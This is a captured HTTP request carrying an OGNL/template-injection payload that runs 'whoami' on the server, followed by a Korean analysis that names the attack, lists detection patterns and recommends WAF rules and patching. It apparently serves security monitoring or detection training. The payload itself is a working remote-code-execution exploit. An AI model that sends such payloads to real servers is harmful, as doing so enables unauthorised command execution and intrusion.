POST /template/aui/text-inline.vm HTTP/1.1
Host: 172.16.1.30
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Content-Length: 303
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded

label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\u0027x_vuln_check\u0027,(new+freemarker.template.utility.Execute()).exec({"whoami"}))
- 공격 이름: `Struts2 OGNL Injection`
- 판단 근거: `#request.get('.key_velocity.struts2.context').internalget('ognl').findvalue(#parameters.poc[0],{})` 와 같이 OGNL 표현식을 사용하고 있으며, whoami 명령어 실행 시도가 보입니다.
- 탐지 패턴: `#request.get`, `.internalget('ognl')`, `findvalue`, `@org.apache.struts2.servletactioncontext@getresponse().setheader`
- 설명: Struts2 프레임워크의 취약점을 이용하여 OGNL(Object-Graph Navigation Language) 표현식을 주입하고, 원격 코드 실행을 하는 공격입니다.
- 대응 방법: 웹 애플리케이션 방화벽 (WAF)에서 `#request.get`, `.internalget('ognl')`, `@org.apache.struts2.servletactioncontext@getresponse().setheader` 와 같은 패턴을 탐지하여 차단하고, Struts2 프레임워크를 최신 버전으로 업데이트해야 합니다.

